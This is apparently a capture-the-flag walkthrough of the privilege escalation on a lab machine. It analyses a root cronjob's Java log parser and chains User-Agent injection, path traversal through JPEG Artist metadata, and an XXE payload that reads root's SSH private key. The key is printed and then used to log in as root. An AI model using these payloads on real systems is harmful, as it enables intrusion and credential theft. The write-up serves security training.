## Enumeration
Use pspy to find what looks like some cronjobs
```bash
2022/08/22 20:26:22 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/08/22 20:28:01 CMD: UID=0    PID=37639  | /bin/sh -c /root/run_credits.sh 
2022/08/22 20:28:01 CMD: UID=0    PID=37638  | /bin/sh -c /root/run_credits.sh 
2022/08/22 20:28:01 CMD: UID=0    PID=37637  | /usr/sbin/CRON -f 
2022/08/22 20:28:01 CMD: UID=0    PID=37640  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
```
Looking around in /opt reveals the java source file that ```/opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar``` is built from: ```/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java```

## Static code analysis
Looking at the java source file shows that this cronjob is parsing a log file that my user can read every minute or so. 
```java
// Main method for App.java. All comments in this code block were added by me.
public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
		                      // log file that the jar is parsing every minute
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
	        // This line will grab one line at a time from the log file
            String line = log_reader.nextLine();
            // The "isImage" method checks for the string "jpg" in the log entry
	            // Should be noted that it doesn't make sure that the requested file is a jpg, which is what this method is trying to do.
	            // Putting "jpg" into the useragent will bypass this check  
            if(!isImage(line))
            {
                continue;
            }
            // Parses log entry into a hash map which is basically a python dictionary
            Map parsed_data = parseLog(line);
            // This is the URI that the user was navigating to when the log entry was made
            System.out.println(parsed_data.get("uri"));
            // See below...
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            // Take the artist that was just found and use it to create this path.
            // Again, there is no sanitization on the artist variable, which allows for a directory traversal payload here
            String xmlPath = "/credits/" + artist + "_creds.xml";
            // See below...
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }
    }

// This method attempts to retrieve the Metadata value for the 'Artist' key on the image that was specified in the provided uri
public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
		                  // This path is not writable by my user, but there is no sanitization in place for the uri variable. So a directory traveral
		                  // payload in the uri variable can all for any file to be passed in here.    
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        // This line will throw an error if the given file is not an image
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    // If a metadata key of "Artist" is found, its value will be returned.
                    return tag.getDescription();
                }
            }
        }
        return "N/A";

// This method does a bunch of stuff that isn't too important
// The important part is that it is parsing an XML file that is provided through the path parameter
// Arbitrary XML parsing -> XXE
public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());
        File fd = new File(path);
        Document doc = saxBuilder.build(fd);
        Element rootElement = doc.getRootElement();
        for(Element el: rootElement.getChildren())
        {
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
```

## XXE
Now that I've reviewed the static source code, it's time to attempt an XXE attack.
For this to work, there are a few things I need to prepare.
1. I need a jpg file on the host with a metadata entry for "Author". The value of this entry should be a directory traversal payload to a XML file that I can control. In this case, I stole one of the images that was already on the web server and edited the Author entry to point to a file in /tmp. (Note from the main method of App.java that "\_creds.xml" is appended to the provided value)
```bash
$ exiftool angy.jpg                                                
ExifTool Version Number         : 12.44
File Name                       : angy.jpg
Directory                       : .
[Truncated]
Artist                          : ../tmp/test
[Truncated]
```
2. Next, there needs to be a valid XML file that matches the name of the one provided in the metadata. This file should include an XXE payload for reading a file. In this case, I guessed there would be a private key in the root users .ssh directory and tried for that. 
```bash
root@redpanda:/tmp $ cat test_creds.xml 
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/.ssh/id_rsa'>]><root>&test;</root>
```
Now that all the preparations are made, it's time to create the log entries. Trying to navigate to a uri that contains a path traversal didn't work for me; for some reason it wouldn't ever show up in the log. Due to how the parsing method is identifying the uri, there is an easy way around this.
```java
public static Map parseLog(String line) {
		// This function takes the raw log entry and splits in on "||"
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        // Entries into the map are created based of indexing of the split input...
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);

        return map;
    }
```
If it's not obvious from the code snippet, I can influence what goes into the map's "uri" entry by manually adding the split characters (||) to my User-Agent. So the request will look something like this:
![[Pasted image 20220824184906.png]]
Now, it doesn't matter what page I navigate to, because the parsing method will see those double bars in the User-Agent and grab the string right after it for the uri.
All that's left now is to wait for the cronjob to run. Checking the contents of the XML file about a minute later shows the private key I was looking for.
```bash
root@redpanda:/tmp $ cat test_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root>
<root>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</root>
```
Grab that key, and get a shell as the root user.
```bash
$ ssh -i root_rsa root@10.10.11.170
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

[Truncated]
 
root@redpanda:~# id
uid=0(root) gid=0(root) groups=0(root)
```